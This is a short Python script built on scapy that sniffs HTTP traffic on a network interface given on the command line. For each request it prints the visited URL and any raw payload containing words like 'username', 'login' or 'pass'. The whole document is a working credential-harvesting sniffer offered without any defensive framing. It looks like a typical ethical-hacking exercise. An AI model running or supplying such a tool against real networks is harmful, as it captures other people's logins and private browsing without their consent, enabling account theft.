import scapy.all as s
from scapy.layers import http
import optparse

def get_arguments():
    parseobj=optparse.OptionParser()
    parseobj.add_option('-i','--interface',dest='i',help="the interface you want to sniff")
    options,arguments=parseobj.parse_args()
    if not options.i:
        print("Please enter required interface...")
    return options



def sniffer(i):
    s.sniff(iface=i,store=False,prn=process_sniff_packet)

def process_sniff_packet(packet):
    keyword=['username','login','user','pass','passowrd'] ## dictionary to check for possible keywords used 
    if packet.haslayer(http.HTTPRequest): #check if the packet has a http request later
        url=packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path
        print(">>>>url visited:  "+url)
        if(packet.haslayer(s.Raw)):    #passwords and  usernames are stored in the raw layer so we are checking that
            load=packet[s.Raw].load
            for key in keyword:
                if key in str(load):
                    print(">>>potential user, pass used:  "+str(load))
                    break
            

options=get_arguments()
sniffer(options.i)